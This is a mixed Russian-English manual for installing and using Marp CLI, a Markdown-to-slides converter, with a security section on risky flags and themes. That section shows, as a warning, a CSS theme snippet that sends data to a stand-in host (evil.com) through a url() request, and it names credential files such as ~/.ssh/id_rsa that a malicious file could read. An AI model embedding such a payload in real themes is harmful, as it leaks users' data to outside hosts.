# Marp CLI — Installation & Usage Manual

**Marp CLI** — консольный инструмент для конвертации Markdown-презентаций (с Marp-разметкой) в HTML, PDF, PowerPoint и изображения. Под капотом использует headless-браузер для рендеринга слайдов.

## Table of Contents
- [Overview](#overview)
- [Dependencies](#dependencies)
- [Installation](#installation)
  - [Homebrew (macOS)](#1-homebrew-macos--recommended)
  - [NPM (global)](#2-npm-global)
  - [NPX (one-shot)](#3-npx-one-shot-without-installation)
  - [Standalone Binary](#4-standalone-binary)
  - [Docker](#5-docker)
- [Core Commands](#core-commands)
  - [Conversion](#conversion)
  - [Live Preview](#live-preview)
  - [Dev Server](#dev-server)
  - [Custom Themes](#custom-themes)
  - [Batch Processing](#batch-processing)
- [Configuration File](#configuration-file)
- [Integration with marp-slide Skill](#integration-with-marp-slide-skill)
- [Security](#security)
  - [Флаг --html](#флаг---html--основной-риск)
  - [Флаг --allow-local-files](#флаг---allow-local-files--доступ-к-файловой-системе)
  - [Кастомные темы](#кастомные-темы-как-вектор-атаки)
  - [Безопасная конфигурация](#безопасная-конфигурация)
  - [Матрица угроз](#матрица-угроз)
  - [Рекомендации](#рекомендации)
- [Troubleshooting](#troubleshooting)
- [References](#references)

## Overview

Marp CLI принимает на вход Markdown-файл с frontmatter `marp: true` и встроенными CSS-стилями, затем рендерит его в выбранный формат. Поддерживаемые выходные форматы:

| Format | Extension | Use Case |
|:---|:---|:---|
| HTML | `.html` | Интерактивная презентация в браузере |
| PDF | `.pdf` | Для печати и шаринга |
| PowerPoint | `.pptx` | Совместимость с MS Office |
| PNG | `.png` | Изображения слайдов (по одному на слайд) |
| JPEG | `.jpg` | Сжатые изображения слайдов |

## Dependencies

| Dependency | Purpose | Required? |
|:---|:---|:---|
| **Node.js v18+** | Runtime environment | Yes (except Homebrew / Standalone / Docker) |
| **Chrome / Edge / Firefox** | Rendering engine for PDF, PPTX, PNG export | Yes, for non-HTML export |

### Browser Auto-Detection

При экспорте в PDF/PPTX/PNG Marp CLI автоматически ищет установленный браузер в следующем порядке:
1. Google Chrome
2. Microsoft Edge
3. Mozilla Firefox

Если ни один не найден — экспорт в HTML всё равно работает без браузера.

### Проверка зависимостей

```bash
# Check Node.js version (need v18+)
node --version

# Check if Chrome is available (macOS)
ls /Applications/Google\ Chrome.app

# Check if Marp CLI is installed
marp --version
```

## Installation

### 1. Homebrew (macOS) — Recommended

Самый простой вариант для macOS. Не требует отдельной установки Node.js.

```bash
brew install marp-cli
```

**Обновление:**
```bash
brew upgrade marp-cli
```

**Проверка:**
```bash
marp --version
```

### 2. NPM (global)

Подходит если Node.js уже установлен. Даёт глобальную команду `marp`.

```bash
npm install -g @marp-team/marp-cli
```

**Обновление:**
```bash
npm update -g @marp-team/marp-cli
```

**Для конкретного проекта (локально):**
```bash
npm install --save-dev @marp-team/marp-cli
```

При локальной установке `marp` доступен через `npx marp` или в npm-scripts (`package.json`).

### 3. NPX (one-shot, without installation)

Скачивает и запускает последнюю версию без установки. Подходит для разовых конвертаций.

```bash
npx @marp-team/marp-cli@latest slides.md -o slides.html
```

Не засоряет систему, но при каждом запуске скачивает пакет заново.

### 4. Standalone Binary

На [странице релизов](https://github.com/marp-team/marp-cli/releases) доступны готовые бинарники:
- **Linux** (x64)
- **macOS** (Apple Silicon / x64)
- **Windows** (x64)

Node.js уже включён внутрь бинарника — ничего дополнительно ставить не нужно.

```bash
# macOS: скачать, распаковать, переместить
curl -L https://github.com/marp-team/marp-cli/releases/latest/download/marp-cli-macos.tar.gz | tar xz
mv marp /usr/local/bin/
```

**Ограничения standalone:**
- Не поддерживает конфигурационные файлы в ES Module формате
- Только конкретные архитектуры (нет ARM Linux)

### 5. Docker

Полная изоляция — не нужен ни Node.js, ни браузер.

```bash
# Конвертация в PDF
docker run --rm -v $(pwd):/home/marp/app marpteam/marp-cli slides.md --pdf

# Конвертация в HTML
docker run --rm -v $(pwd):/home/marp/app marpteam/marp-cli slides.md -o slides.html
```

**Алиас для удобства** (добавить в `~/.zshrc`):
```bash
alias marp='docker run --rm -v $(pwd):/home/marp/app marpteam/marp-cli'
```

После этого можно использовать как обычную команду:
```bash
marp slides.md --pdf
```

## Core Commands

### Conversion

```bash
# Markdown → HTML
marp slides.md -o slides.html

# Markdown → PDF
marp slides.md --pdf
# or
marp slides.md -o slides.pdf

# Markdown → PowerPoint
marp slides.md --pptx
# or
marp slides.md -o slides.pptx

# Markdown → PNG (one image per slide)
marp slides.md --images png

# Markdown → JPEG
marp slides.md --images jpeg
```

### Live Preview

Watch-mode автоматически пересобирает HTML при изменении исходного файла:

```bash
marp -w slides.md -o slides.html
```

Откройте `slides.html` в браузере — он автоматически обновится при каждом сохранении `.md` файла.

### Dev Server

Запускает встроенный HTTP-сервер с live-reload:

```bash
# Serve all .md files in directory
marp -s ./slides/

# Serve on specific port
marp -s ./slides/ --port 3000
```

Откройте `http://localhost:8080` (или указанный порт) в браузере.

### Custom Themes

Подключение внешнего CSS-файла темы:

```bash
# Use custom theme
marp --theme ./my-theme.css slides.md -o slides.html

# Use theme from URL
marp --theme https://example.com/theme.css slides.md
```

### Batch Processing

Конвертация всех `.md` файлов в директории:

```bash
# Convert all slides in folder to HTML
marp ./presentations/

# Convert all to PDF
marp --pdf ./presentations/

# With output directory
marp -o ./output/ ./presentations/
```

## Configuration File

Создайте `.marprc.yml` в корне проекта для настроек по умолчанию:

```yaml
# .marprc.yml
allowLocalFiles: false
theme: ./assets/custom-theme.css
html: false
pdf: false
options:
  loggingLevel: warn
```

> **Примечание:** `allowLocalFiles` и `html` по умолчанию `false` из соображений безопасности. Включайте только для доверенного контента — см. раздел [Security](#security) ниже.

Поддерживаемые форматы конфигурации: `.marprc.yml`, `.marprc.yaml`, `.marprc.json`, `.marprc.js`, `marp.config.js`, `marp.config.mjs`.

## Integration with marp-slide Skill

Скилл `marp-slide` и Marp CLI работают **независимо**, но дополняют друг друга:

```
┌─────────────────┐         ┌─────────────┐         ┌──────────────┐
│   marp-slide    │         │  Marp CLI   │         │   Output     │
│   (AI skill)    │ ──MD──▶ │  (renderer) │ ──▶──▶  │  HTML/PDF/   │
│                 │         │             │         │  PPTX/PNG    │
│ Generates .md   │         │ Converts to │         │              │
│ with embedded   │         │ final format│         │ Ready to     │
│ CSS & content   │         │             │         │ present      │
└─────────────────┘         └─────────────┘         └──────────────┘
```

- **marp-slide** генерирует `.md` файл с embedded CSS, структурированным контентом и правильной Marp-разметкой
- **Marp CLI** конвертирует этот файл в финальный формат
- **Альтернатива CLI** — расширение Marp for VS Code (preview: `Cmd+Shift+V`, экспорт через Command Palette)

### Типичный рабочий процесс

```bash
# 1. Попросить AI сгенерировать слайды (скилл marp-slide)
# → Output: presentation.md

# 2. Preview в VS Code
#    Cmd+Shift+V

# 3. Export в PDF для шаринга
marp presentation.md --pdf

# 4. Или запустить dev-server для live-презентации
marp -s . --port 3000
```

## Security

Marp CLI спроектирован с принципом security-first. Два самых опасных флага — `--html` и `--allow-local-files` — **выключены по умолчанию**. Понимание того, когда и зачем их включать, критически важно.

### Флаг `--html` — основной риск

По умолчанию Marp **удаляет** raw HTML-теги из Markdown-файлов. Флаг `--html` снимает эту защиту.

| Режим | Поведение | Риск |
|:---|:---|:---|
| Без `--html` (default) | HTML-теги игнорируются | Безопасно |
| С `--html` | HTML рендерится как есть | Возможен XSS, если файл из непроверенного источника |

**Правило:** включай `--html` только для **своих** файлов. Никогда — для файлов от третьих лиц.

### Флаг `--allow-local-files` — доступ к файловой системе

По умолчанию Marp CLI **не имеет** доступа к локальным файлам. Это сделано намеренно — предыдущая версия Marp (classic) [использовалась злоумышленниками для кражи локальных файлов](https://github.com/marp-team/marp-cli).

| Режим | Поведение | Риск |
|:---|:---|:---|
| Без флага (default) | Локальные изображения не загружаются | Безопасно |
| С `--allow-local-files` | Доступ к **любым** файлам на диске | Вредоносный `.md` может прочитать `/etc/passwd`, `~/.ssh/id_rsa` и т.д. |

**Правило:** используй `--allow-local-files` только с **доверенными** Markdown-файлами. Для недоверенных — загружай картинки онлайн или кодируй в base64.

### Кастомные темы как вектор атаки

CSS-тема может содержать payload для эксфильтрации данных:

```css
/* Безобидно */
section { background: #fff; }

/* Опасно — утечка данных через внешний запрос */
section::after {
  content: url("https://evil.com/steal?data=...");
}
```

**Правило:** используй только свои темы или темы из проверенных источников. Встроенные 7 тем скилла `marp-slide` безопасны — они хранятся локально в `assets/`.

### Безопасная конфигурация

Рекомендуемый `.marprc.yml` для проектов с внешними контрибьюторами:

```yaml
# .marprc.yml — safe defaults
allowLocalFiles: false   # запретить доступ к локальным файлам
html: false              # запретить raw HTML рендеринг
```

### Матрица угроз

| Сценарий | Уровень угрозы | Защита |
|:---|:---|:---|
| Рендер **своего** файла | Минимальная | Можно включать `--html` и `--allow-local-files` |
| Рендер файла от **коллеги** | Средняя | Просмотреть `.md` перед рендером, не включать `--html` |
| Рендер файла из **интернета** | Высокая | Без `--html`, без `--allow-local-files`, просмотреть CSS |
| Шаринг **HTML-экспорта** | Средняя | HTML-файл может содержать JS — лучше шарить PDF |
| CI/CD pipeline | Средняя | Docker-изоляция, фиксированные темы, без `--allow-local-files` |

### Рекомендации

1. **Для шаринга** — экспортируй в PDF, не в HTML. PDF не исполняет JavaScript.
2. **Для презентации** — HTML в браузере, но только свои файлы.
3. **Для CI/CD** — Docker-контейнер с фиксированными темами, без флагов доступа.
4. **Изображения** — загружай на CDN/GitHub и используй HTTPS-ссылки вместо `--allow-local-files`.
5. **Не доверяй** `.md` файлам из непроверенных PR — просматривай CSS и HTML-блоки перед рендером.

## Troubleshooting

| Problem | Cause | Fix |
|:---|:---|:---|
| `command not found: marp` | CLI не установлен | `brew install marp-cli` или `npm i -g @marp-team/marp-cli` |
| PDF export fails | Chrome/Edge/Firefox не найден | Установить Chrome или указать путь: `CHROME_PATH=/path/to/chrome marp --pdf` |
| Fonts look wrong in PDF | Шрифты не установлены в системе | Установить шрифты локально или использовать Google Fonts через `@import url()` |
| Images not found in PDF | Относительные пути не работают | Использовать `--allow-local-files` или абсолютные пути |
| `PUPPETEER_TIMEOUT` error | Слишком сложный слайд / медленная машина | Увеличить timeout: `PUPPETEER_TIMEOUT=60000 marp --pdf` |
| Docker: permission denied | Volume mapping rights | Добавить `--user $(id -u):$(id -g)` к docker run |
| Standalone: config not loading | ES Module не поддерживается | Использовать `.marprc.yml` вместо `marp.config.mjs` |

## References

- [Marp CLI — GitHub](https://github.com/marp-team/marp-cli)
- [@marp-team/marp-cli — npm](https://www.npmjs.com/package/@marp-team/marp-cli)
- [Marp CLI Releases](https://github.com/marp-team/marp-cli/releases)
- [Marp Official Site](https://marp.app/)
- [Marp for VS Code](https://marketplace.visualstudio.com/items?itemName=marp-team.marp-vscode)
